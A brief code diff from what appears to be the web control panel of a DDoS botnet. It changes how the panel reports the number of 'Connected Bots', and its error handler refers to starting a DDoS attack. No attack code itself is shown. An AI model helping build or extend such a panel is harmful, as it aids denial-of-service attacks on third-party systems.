@@ -394,8 +394,12 @@ async def get():
                         .then(response => response.json())
                         .then(data => {
                             console.log("Connected Bots", data);
-                            // alert(data.message);  // Show the confirmation message to the user
-                            document.getElementById("botCountDisplay").innerText = `Connected Bots: ${data.message}`;
+                            if (data.message === "Bot count not found.") {
+                                    alert(data.message);
+                                } else {
+                                    alert("Bots Connected: " + data.message);
+                                    // document.getElementById("botCountDisplay").innerText = `Connected Bots: ${data.message}`;
+                                } // Show the confirmation message to the user
                         })
                         .catch(error => {
                             console.error("Error starting DDoS attack:", error);
